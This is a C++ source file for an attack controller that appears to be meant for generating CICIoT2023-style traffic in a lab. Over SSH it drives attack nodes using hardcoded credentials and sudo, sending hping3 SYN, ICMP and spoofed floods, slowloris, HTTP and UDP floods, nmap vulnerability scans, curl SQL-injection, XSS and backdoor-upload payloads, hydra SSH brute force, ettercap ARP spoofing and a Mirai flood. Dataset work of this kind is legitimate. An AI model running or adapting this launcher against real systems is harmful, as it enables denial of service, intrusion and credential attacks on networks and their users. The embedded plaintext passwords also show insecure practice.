#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include <mutex>
#include <libssh/libssh.h>
#include "../../include/attack_node.h"

// === 全局配置 ===
const std::string TARGET_IP = "192.168.0.230";
const int DEFAULT_DURATION = 60;

std::mutex cout_mutex;

std::string generate_command(AttackType type, std::string target, int duration) {
    std::string hping_base = "timeout " + std::to_string(duration) + "s hping3 --flood ";
    std::string nmap_base = "timeout " + std::to_string(duration) + "s nmap ";

    switch (type) {
        // DDoS
        case AttackType::DDOS_ACK_FRAGMENTATION: return hping_base + "-A -f -d 1200 -p 80 " + target;
        case AttackType::DDOS_UDP_FLOOD: return "timeout " + std::to_string(duration) + "s ./udp_flood " + target + " --threads 10";
        case AttackType::DDOS_SLOWLORIS: return "timeout " + std::to_string(duration) + "s /usr/local/conda/bin/slowloris " + target + " -s 500";
        case AttackType::DDOS_ICMP_FLOOD: return hping_base + "--icmp " + target;
        case AttackType::DDOS_RST_FIN_FLOOD: return hping_base + "-R -F -p 80 " + target;
        case AttackType::DDOS_PSH_ACK_FLOOD: return hping_base + "-P -A -p 80 " + target;
        case AttackType::DDOS_HTTP_FLOOD: return "timeout " + std::to_string(duration) + "s ./httpflood " + target + " --threads 20";
        case AttackType::DDOS_UDP_FRAGMENTATION: return "timeout " + std::to_string(duration) + "s ./udp_flood " + target + " --packets 10 --threads 5"; // Example fragment
        case AttackType::DDOS_ICMP_FRAGMENTATION: return hping_base + "--icmp -f -d 1200 " + target;
        case AttackType::DDOS_TCP_FLOOD: return hping_base + "-p 80 " + target;
        case AttackType::DDOS_SYN_FLOOD: return hping_base + "-S -p 80 " + target;
        case AttackType::DDOS_SYNONYMOUS_IP_FLOOD: return hping_base + "-S -a " + target + " -p 80 " + target;

        // DoS
        case AttackType::DOS_TCP_FLOOD: return hping_base + "-p 80 " + target;
        case AttackType::DOS_HTTP_FLOOD: return "timeout " + std::to_string(duration) + "s ./httpflood " + target + " --threads 20";
        case AttackType::DOS_SYN_FLOOD: return hping_base + "-S -p 80 " + target;
        case AttackType::DOS_UDP_FLOOD: return hping_base + "--udp -p 53 " + target; // or use ./udp_flood

        // Recon
        case AttackType::RECON_PING_SWEEP: return nmap_base + "-sn " + target + "/24";
        case AttackType::RECON_OS_SCAN: return nmap_base + "-O " + target;
        case AttackType::RECON_VULNERABILITY_SCAN: return nmap_base + "--script vuln " + target;
        case AttackType::RECON_PORT_SCAN: return nmap_base + "-p- " + target;
        case AttackType::RECON_HOST_DISCOVERY: return nmap_base + "-sn " + target;

        // Web-Based
        case AttackType::WEB_SQL_INJECTION: return "curl -X POST -d \"id=1' OR '1'='1\" " + target + "/login.php"; // DVWA[56]
        case AttackType::WEB_COMMAND_INJECTION: return "curl " + target + "/cmd.php?cmd=ls"; // DVWA[56]
        case AttackType::WEB_BACKDOOR_MALWARE: return "curl -X POST -F \"file=@backdoor.php\" " + target + "/upload.php"; // DVWA[56]&Remot3d[57]
        case AttackType::WEB_UPLOADING_ATTACK: return "curl -X POST -F \"file=@payload.jpg\" " + target + "/upload.php"; // DVWA[56]
        case AttackType::WEB_XSS: return "curl -X POST -d \"comment=<script>alert('XSS')</script>\" " + target + "/comment.php"; // DVWA[56]
        case AttackType::WEB_BROWSER_HIJACKING: return "./beef_attack " + target; // Beef[58]
        
        // Brute Force
        case AttackType::BRUTE_DICTIONARY: return "hydra -l admin -P passlist.txt " + target + " ssh";

        // Spoofing
        case AttackType::SPOOF_ARP: return "ettercap -T -M arp /" + target + "// /" + target + "//";

        // Mirai (Adapted)
        case AttackType::MIRAI_GREIP_FLOOD: return "./mirai_flood greip " + target + " " + std::to_string(duration);

        default: return "";
    }
}

void execute_remote_command(AttackNode node, std::string cmd) {
    ssh_session session = ssh_new();
    if (session == NULL) return;
    ssh_options_set(session, SSH_OPTIONS_HOST, node.ip.c_str());
    ssh_options_set(session, SSH_OPTIONS_USER, node.username.c_str());

    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Node " << node.ip << "] Connecting..." << std::endl;
    }

    if (ssh_connect(session) != SSH_OK) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "[Node " << node.ip << "] Connection failed: " << ssh_get_error(session) << std::endl;
        ssh_free(session);
        return;
    }

    if (ssh_userauth_password(session, NULL, node.password.c_str()) != SSH_AUTH_SUCCESS) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "[Node " << node.ip << "] Auth failed." << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    // 显示当前目录
    ssh_channel pwd_channel = ssh_channel_new(session);
    if (pwd_channel && ssh_channel_open_session(pwd_channel) == SSH_OK) {
        ssh_channel_request_exec(pwd_channel, "pwd");
        char buffer[256];
        int nbytes = ssh_channel_read(pwd_channel, buffer, sizeof(buffer) - 1, 0);
        if (nbytes > 0) {
            buffer[nbytes] = '\0';
            std::lock_guard<std::mutex> lock(cout_mutex);
            std::cout << "[Node " << node.ip << "] Current Dir: " << buffer;
        }
        ssh_channel_close(pwd_channel);
        ssh_channel_free(pwd_channel);
    }

    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Node " << node.ip << "] Executing command..." << std::endl;
    }

    ssh_channel channel = ssh_channel_new(session);
    if (channel && ssh_channel_open_session(channel) == SSH_OK) {
        // 重定向 stderr 到 stdout (2>&1)，以便看到报错信息
        std::string full_cmd = "echo '" + node.password + "' | sudo -S " + cmd + " 2>&1";
        ssh_channel_request_exec(channel, full_cmd.c_str());
        
        char buffer[1024];
        int nbytes;
        // 读取并实时打印远程输出
        while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0)) > 0) {
            buffer[nbytes] = '\0';
            std::lock_guard<std::mutex> lock(cout_mutex);
            std::cout << "[Node " << node.ip << " Output]: " << buffer;
        }
        
        ssh_channel_close(channel);
    }
    
    if (channel) ssh_channel_free(channel);
    ssh_disconnect(session);
    ssh_free(session);

    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "[Node " << node.ip << "] Task finished." << std::endl;
    }
}

int main() {
    if (ssh_init() < 0) return -1;

    std::vector<AttackNode> nodes = {
        {"192.168.0.146", "neardi", "lindikeji"},
        // {"192.168.0.101", "kali", "kali"}
    };

    std::cout << "=== CICIoT2023 DDoS Master Controller ===" << std::endl;
    std::cout << "1. DDoS Attacks\n";
    std::cout << "2. DoS Attacks\n";
    std::cout << "3. Reconnaissance\n";
    std::cout << "4. Web-Based Attacks\n";
    std::cout << "5. Brute Force\n";
    std::cout << "6. Spoofing\n";
    std::cout << "7. Mirai Attacks\n";
    std::cout << "Select Category: ";
    int cat_choice; std::cin >> cat_choice;

    AttackType selected;
    int type_choice;

    if (cat_choice == 1) { // DDoS
        std::cout << "1. ACK Fragmentation\n2. UDP Flood\n3. Slowloris\n4. ICMP Flood\n5. RST/FIN Flood\n";
        std::cout << "6. PSH/ACK Flood\n7. HTTP Flood\n8. UDP Frag\n9. ICMP Frag\n10. TCP Flood\n11. SYN Flood\n";
        std::cout << "Select DDoS Type: ";
        std::cin >> type_choice;
        switch(type_choice) {
            case 1: selected = AttackType::DDOS_ACK_FRAGMENTATION; break;
            case 2: selected = AttackType::DDOS_UDP_FLOOD; break;
            case 3: selected = AttackType::DDOS_SLOWLORIS; break;
            case 4: selected = AttackType::DDOS_ICMP_FLOOD; break;
            case 5: selected = AttackType::DDOS_RST_FIN_FLOOD; break;
            case 6: selected = AttackType::DDOS_PSH_ACK_FLOOD; break;
            case 7: selected = AttackType::DDOS_HTTP_FLOOD; break;
            case 8: selected = AttackType::DDOS_UDP_FRAGMENTATION; break;
            case 9: selected = AttackType::DDOS_ICMP_FRAGMENTATION; break;
            case 10: selected = AttackType::DDOS_TCP_FLOOD; break;
            case 11: selected = AttackType::DDOS_SYN_FLOOD; break;
            default: selected = AttackType::DDOS_SYN_FLOOD;
        }
    } else if (cat_choice == 2) { // DoS
        std::cout << "1. TCP Flood\n2. HTTP Flood\n3. SYN Flood\n4. UDP Flood\nSelect DoS Type: ";
        std::cin >> type_choice;
        if (type_choice == 1) selected = AttackType::DOS_TCP_FLOOD;
        else if (type_choice == 2) selected = AttackType::DOS_HTTP_FLOOD;
        else if (type_choice == 3) selected = AttackType::DOS_SYN_FLOOD;
        else selected = AttackType::DOS_UDP_FLOOD;
    } else if (cat_choice == 3) { // Recon
        std::cout << "1. Ping Sweep\n2. OS Scan\n3. Vuln Scan\n4. Port Scan\n5. Host Discovery\nSelect Recon Type: ";
        std::cin >> type_choice;
        if (type_choice == 1) selected = AttackType::RECON_PING_SWEEP;
        else if (type_choice == 2) selected = AttackType::RECON_OS_SCAN;
        else if (type_choice == 3) selected = AttackType::RECON_VULNERABILITY_SCAN;
        else if (type_choice == 4) selected = AttackType::RECON_PORT_SCAN;
        else selected = AttackType::RECON_HOST_DISCOVERY;
    } else if (cat_choice == 4) { // Web-Based
        std::cout << "1. SQL Injection \n";
        std::cout << "2. Command Injection \n";
        std::cout << "3. Backdoor Malware \n";
        std::cout << "4. Uploading Attack \n";
        std::cout << "5. XSS \n";
        std::cout << "6. Browser Hijacking \n";
        std::cout << "Select Web Attack Type: ";
        std::cin >> type_choice;
        if (type_choice == 1) selected = AttackType::WEB_SQL_INJECTION;
        else if (type_choice == 2) selected = AttackType::WEB_COMMAND_INJECTION;
        else if (type_choice == 3) selected = AttackType::WEB_BACKDOOR_MALWARE;
        else if (type_choice == 4) selected = AttackType::WEB_UPLOADING_ATTACK;
        else if (type_choice == 5) selected = AttackType::WEB_XSS;
        else if (type_choice == 6) selected = AttackType::WEB_BROWSER_HIJACKING;
        else selected = AttackType::WEB_SQL_INJECTION;
    } else if (cat_choice == 5) { // Brute Force
        std::cout << "1. Dictionary Attack\nSelect Brute Force Type: ";
        std::cin >> type_choice;
        selected = AttackType::BRUTE_DICTIONARY;
    } else if (cat_choice == 6) { // Spoofing
        std::cout << "1. ARP Spoofing\nSelect Spoofing Type: ";
        std::cin >> type_choice;
        if (type_choice == 1) selected = AttackType::SPOOF_ARP;
        else selected = AttackType::SPOOF_ARP;
    } else if (cat_choice == 7) { // Mirai
        selected = AttackType::MIRAI_GREIP_FLOOD;
    } else {
        selected = AttackType::DDOS_SYN_FLOOD;
    }

    std::string cmd = generate_command(selected, TARGET_IP, DEFAULT_DURATION);
    std::cout << "Target: " << TARGET_IP << "\nCommand: " << cmd << "\n---" << std::endl;

    std::vector<std::thread> threads;
    for (const auto& node : nodes) {
        threads.emplace_back(execute_remote_command, node, cmd);
    }

    for (auto& t : threads) t.join();

    ssh_finalize();
    std::cout << "All nodes have completed execution." << std::endl;
    return 0;
}
